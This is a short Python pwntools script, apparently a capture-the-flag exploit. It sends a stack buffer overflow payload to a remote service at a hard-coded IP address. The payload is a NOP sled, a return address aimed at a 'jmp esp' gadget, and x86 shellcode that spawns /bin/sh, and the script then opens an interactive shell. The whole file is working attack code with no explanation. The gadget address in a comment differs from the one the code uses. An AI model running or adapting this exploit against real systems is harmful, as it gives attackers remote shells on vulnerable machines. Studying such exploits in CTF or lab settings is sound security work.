from pwn import *
import struct

r = remote("104.154.106.182", 3456)

# Length of the vuln buffer
BUFFER_LEN = 44

# sh shellcode 
SHELLCODE = b""
SHELLCODE += b"\x31\xc0\x50\x68\x2f\x2f\x73"
SHELLCODE += b"\x68\x68\x2f\x62\x69\x6e\x89"
SHELLCODE += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
SHELLCODE += b"\xcd\x80\x31\xc0\x40\xcd\x80"

# Will take us to just after the ret pointer
# 0x08048544 : jmp esp
ret_add = p32(0x8048541)

payload = b""
payload += b"\x90" * BUFFER_LEN
payload += ret_add
payload += SHELLCODE

r.recv()
r.sendline(payload)
r.interactive()
